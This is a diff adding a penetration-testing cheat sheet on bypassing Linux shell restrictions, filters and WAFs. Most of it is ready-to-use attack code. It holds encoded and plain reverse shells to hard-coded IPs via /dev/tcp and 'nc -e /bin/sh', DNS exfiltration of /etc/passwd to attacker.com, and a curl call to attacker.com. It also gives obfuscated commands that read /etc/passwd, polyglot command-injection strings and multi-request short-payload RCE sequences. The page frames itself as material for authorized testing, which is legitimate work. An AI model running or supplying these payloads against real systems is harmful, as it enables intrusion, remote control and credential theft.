@@ -1,0 +1,258 @@
+---
+title: "Bypass Linux Restrictions"
+description: "Techniques to bypass bash restrictions, escape jails, evade WAFs, and work around limited shell environments"
+---
+
+## Overview
+
+When a shell is restricted (rbash, limited sudo, filtered inputs, sandboxed environments), attackers use encoding, obfuscation, and creative shell syntax to bypass these limitations. This page covers the core bypass techniques used in CTFs and real-world penetration tests.
+
+<Warning>
+These techniques are documented for authorized security testing and defensive awareness. Always operate within the scope of your engagement.
+</Warning>
+
+## Reverse Shell Bypasses
+
+### Double Base64 Encoded Reverse Shell
+
+Useful for evading bad-character filters (e.g., `+`, `=`):
+
+```bash
+echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64) | ba''se''6''4 -''d | ba''se''64 -''d | b''a''s''h" \
+  | sed 's/ /${IFS}/g'
+```
+
+### Short Reverse Shell (Dikline Trick)
+
+```bash
+(sh)0>/dev/tcp/10.10.10.10/443
+# Then get output from the reverse shell:
+exec >&0
+```
+
+## Bypassing Forbidden Words and Paths
+
+<Tabs>
+  <Tab title="Question Mark Substitution">
+    ```bash
+    /usr/bin/p?ng          # /usr/bin/ping
+    nma? -p 80 localhost   # nmap -p 80 localhost
+    ```
+  </Tab>
+  <Tab title="Wildcard Substitution">
+    ```bash
+    /usr/bin/who*mi        # /usr/bin/whoami
+    ```
+  </Tab>
+  <Tab title="Character Classes">
+    ```bash
+    /usr/bin/n[c]          # /usr/bin/nc
+    ```
+  </Tab>
+  <Tab title="Quotes and Backslashes">
+    ```bash
+    'p'i'n'g               # ping
+    "w"h"o"a"m"i           # whoami
+    ech''o test            # echo test
+    \u\n\a\m\e \-\a        # uname -a
+    /\b\i\n/////s\h        # /bin/sh
+    ```
+  </Tab>
+  <Tab title="Variable Transformations">
+    ```bash
+    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  # whoami — case transform
+    $(a="WhOaMi";printf %s "${a,,}")   # whoami — bash-only
+    $(rev<<<'imaohw')                  # whoami — reverse
+    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+    ```
+  </Tab>
+  <Tab title="Dollar-Sign and History">
+    ```bash
+    who$@ami               # whoami
+    echo whoami|$0         # Execute via $0
+    !-1!-2                 # History concatenation
+    ```
+  </Tab>
+</Tabs>
+
+## Bypassing Forbidden Spaces
+
+```bash
+# Brace syntax
+{cat,lol.txt}              # cat lol.txt
+{echo,test}                # echo test
+
+# IFS — Internal Field Separator substitution
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+
+# Hex-encoded space
+X=$'cat\x20/etc/passwd'&&$X
+
+# Tab character
+echo "ls\x09-l" | bash
+
+# Putting command in variable
+IFS=];b=cat]/etc/passwd;$b
+```
+
+## Bypassing Backslash and Slash
+
+```bash
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+```
+
+## Bypassing Pipes
+
+```bash
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+## Hex Encoding Bypass
+
+```bash
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
+cat `xxd -r -p <<< 2f6574632f706173737764`
+```
+
+## Bypassing IP Address Filters
+
+```bash
+# Decimal notation
+127.0.0.1 == 2130706433
+```
+
+## Time-Based Data Exfiltration
+
+```bash
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+```
+
+## Getting Characters from Environment Variables
+
+```bash
+echo ${LS_COLORS:10:1}  # ;
+echo ${PATH:0:1}         # /
+```
+
+## DNS Data Exfiltration
+
+Use OOB DNS channels via services like Burp Collaborator or `pingb.in`:
+
+```bash
+# Encode and exfiltrate via DNS query
+data=$(cat /etc/passwd | base64 | tr -d '\n')
+nslookup ${data}.attacker.com
+```
+
+## Builtins-Only Execution (No External Commands)
+
+When PATH is unset and only shell builtins are available:
+
+```bash
+# Check available builtins
+declare builtins
+
+# Set PATH
+PATH="/bin"
+export PATH="/bin"
+SHELL=/bin/bash
+
+# Get "/" character
+printf %.1s "$PWD"
+
+# Execute via printf
+$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
+
+# Read a file
+while read -r line; do echo $line; done < /etc/passwd
+
+# Execute via read
+read aaa; exec $aaa
+
+# Access flags without cat
+source f*
+```
+
+## Polyglot Command Injection
+
+```bash
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+```
+
+## Bypassing Regex Filters
+
+```bash
+# Newlines may bypass letter/number-only regex
+1%0a`curl http://attacker.com`
+```
+
+## Bashfuscator
+
+```bash
+# https://github.com/Bashfuscator/Bashfuscator
+./bashfuscator -c 'cat /etc/passwd'
+```
+
+## RCE with Very Short Payloads
+
+### 5-Character RCE (Orange Tsai Technique)
+
+Build `ls -t>g` across multiple short HTTP requests, creating the command as filenames:
+
+```bash
+http://host/?cmd=>ls\
+http://host/?cmd=ls>_
+http://host/?cmd=>\ \
+http://host/?cmd=>-t\
+http://host/?cmd=>\>g
+http://host/?cmd=ls>>_
+```
+
+### 4-Character RCE
+
+```bash
+'>dir'
+'>sl'
+'>g\>'
+'>ht-'
+'*>v'
+'>rev'
+'*v>x'
+# ... build full command as filenames, then execute
+'sh x'
+'sh g'
+```
+
+## Read-Only / Noexec / Distroless Bypass
+
+In filesystems with `ro` and `noexec` protections, or in distroless containers, code execution is still possible via:
+
+- Loading shared libraries from `/dev/shm` or tmpfs
+- Abusing interpreter binaries already present
+- Using `memfd_create` + `execve` syscalls directly
+
+## Space-Based Bash NOP Sled ("Bashsledding")
+
+When a memory corruption vulnerability lets you partially control an argument reaching `system()`, use leading whitespace as a NOP sled — Bash ignores leading spaces before a command:
+
+```bash
+# Payload with 16-space NOP sled
+"                nc -e /bin/sh 10.0.0.1 4444"
+```
+
+If a ROP chain lands anywhere in the space block, Bash skips to the real command. Useful for:
+
+- Memory-mapped NVRAM entries accessible across processes
+- Cases where NULL bytes cannot be written to align the payload
+- Embedded devices running BusyBox `ash`/`sh`
+
+## References
+
+- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [WAF Bypass Cheat Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
